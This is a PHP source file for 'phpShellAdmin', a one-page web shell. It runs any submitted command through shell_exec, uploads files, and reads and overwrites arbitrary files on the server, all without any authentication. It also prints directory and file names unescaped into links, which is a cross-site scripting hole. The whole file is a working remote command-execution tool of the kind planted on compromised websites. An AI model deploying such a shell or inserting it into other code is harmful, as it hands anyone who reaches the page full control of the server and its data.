<?php

session_start();

if (isset($_GET['dir']))
{
	chdir($_GET['dir']);
}
$cwd = getcwd();

if (isset($_POST['cmd']))
{
	$_SESSION['stdout'] = shell_exec($_POST['cmd'].' 2>&1');
	header('Location: ?dir='.$cwd);
	exit;
}

if (isset($_SESSION['stdout']))
{
	$stdout = $_SESSION['stdout'];
	unset($_SESSION['stdout']);
}

if (isset($_FILES['file']))
{
	if ($_FILES['file']['error'] == 0)
	{
		move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
	}
	header('Location: ?dir='.$cwd);
	exit;
}

if (isset($_GET['file']))
{
	$file = $_GET['file'];
	if (isset($_POST['contents']))
	{
		$contents = preg_replace('/\r\n/', "\n", $_POST['contents']);
		file_put_contents($file, $contents);
		header('Location: ?dir='.$cwd.'&file='.$file);
		exit;
	}
	$contents = file_get_contents($file);
}

$nodes = scandir($cwd);
$dirs = [];
$files = [];
foreach ($nodes as $node)
{
	${ ! is_file($node) ? 'dirs' : 'files'}[] = $node;
}

$vars = (object) [
	'cwd' => $cwd,
	'dirs' => $dirs,
	'files' => $files,
];
if (isset($file))
{
	$vars->file = $file;
	$main_pane = __DIR__.'/ext/'.preg_replace('/.*\./', '', $vars->file).'.php';
	if (file_exists($main_pane))
	{
		$vars->main_pane = $main_pane;
	}
}
if (isset($stdout))
{
	$vars->stdout = $stdout;
}
if (isset($contents))
{
	$vars->contents = $contents;
}

?>
<!DOCTYPE html>
<meta charset="utf-8">
<script>
var changed = false;
window.onload = function()
{
	document.getElementsByName('cmd')[0].focus();
	document.getElementsByName('contents')[0].focus();
};
window.onbeforeunload = function()
{
	if (changed)
	{
		return false;
	}
};
</script>
<style>
body { margin: 0; }
html, body, table { height: 100%; }
td { padding: 0; vertical-align: top; }
ul { margin-top: 0; padding-left: 0; }
pre { margin-top: 0; }
.h100 { height: 100%; }
.w100 { width: 100%; }
.bordered { border:1px solid #ccc; }
</style>
<title>phpShellAdmin</title>
<table>
<tr>
<td class="bordered" colspan="2">
<?php echo htmlspecialchars($vars->cwd); ?>/<?php ?>
<?php if (isset($vars->file)): ?>
<?php echo htmlspecialchars($vars->file); ?>
<?php endif; ?>

<tr>
<td class="bordered">
<form method="post" action="?dir=<?php echo htmlspecialchars($vars->cwd); ?>" enctype="multipart/form-data">
<table><tr>
<td><input type="file" name="file" style="width: 64px;">
<td><input type="submit" value="Upload">
</table>
</form>

<td class="bordered">
<form method="post" action="?dir=<?php echo htmlspecialchars($vars->cwd); ?>">
<table class="w100"><tr>
<td class="w100"><input type="text" class="w100" name="cmd">
<td><input type="submit" value="Execute">
</table>
</form>

<tr>
<td class="bordered">
<ul>
<?php foreach ($vars->dirs as $dir): ?>
<li><a href="?dir=<?php echo $vars->cwd; ?>/<?php echo $dir; ?>"><?php echo htmlspecialchars($dir); ?></a>
<?php endforeach; ?>
</ul>
<ul>
<?php foreach ($vars->files as $file): ?>
<li><a href="?dir=<?php echo $vars->cwd; ?>&amp;file=<?php echo $file; ?>"><?php echo htmlspecialchars($file); ?></a>
<?php endforeach; ?>
</ul>

<td class="bordered h100 w100">
<?php if (isset($vars->main_pane)): ?>
<?php require_once $vars->main_pane; ?>
<?php elseif (isset($vars->stdout)): ?>
<pre>
<?php echo htmlspecialchars($vars->stdout); ?>
</pre>
<?php elseif (isset($vars->contents)): ?>
<form method="post" class="h100">
<table class="h100 w100">
<tr><td class="h100"><textarea class="h100 w100" name="contents" onchange="changed = true;" wrap="off">
<?php echo htmlspecialchars($vars->contents); ?></textarea>
<tr><td><input type="submit" value="Save(S)" accesskey="s" onclick="changed = false;"><input type="button" value="Line jump(G)" accesskey="g" onclick="line_jump();">
</table>
</form>
<?php endif; ?>
</table>
<script>
function line_jump()
{
	var n = prompt('Line number');

	elem = document.getElementsByName('contents')[0];
	var pos1 = -1;
	for (n--; n > 0; n--)
	{
		pos1 = elem.value.indexOf('\n', pos1 + 1);
	}
	pos2 = elem.value.indexOf('\n', pos1 + 1);
	elem.focus();
	elem.setSelectionRange(pos1 + 1, pos2 + 1);
}
document.querySelector('textarea').addEventListener('keydown', function(e) {

	var ctrl = typeof e.modifiers == 'undefined' ? e.ctrlKey : e.modifiers & Event.CONTROL_MASK;
	var shift = typeof e.modifiers == 'undefined' ? e.shiftKey : e.modifiers & Event.SHIFT_MASK;

	if (e.keyCode === 9) {
		e.preventDefault();
		var elem = e.target;
		var val = elem.value;
		var pos1 = elem.selectionStart;
		var pos2 = elem.selectionEnd;
		var buf = val.substr(pos1, pos2 - pos1);

		if (pos2 == pos1)
		{
			buf = '\t' + buf;
			elem.value = val.substr(0, pos1) + buf + val.substr(pos2);
			elem.setSelectionRange(pos1 + 1, pos1 + 1);
		}
		else
		{
			if (shift)
			{
				buf = buf.replace(/\n\t/g, '\n');
				buf = buf.replace(/^\t/, '');
				range2 = pos2 - buf.match(/\n/g).length;
			}
			else
			{
				buf = buf.replace(/\n/g, '\n\t');
				buf = buf.replace(/\t$/, '');
				buf = '\t' + buf;
				range2 = pos2 + buf.match(/\n/g).length;
			}
			elem.value = val.substr(0, pos1) + buf + val.substr(pos2);
			elem.setSelectionRange(pos1, range2);
		}
	}
});
</script>
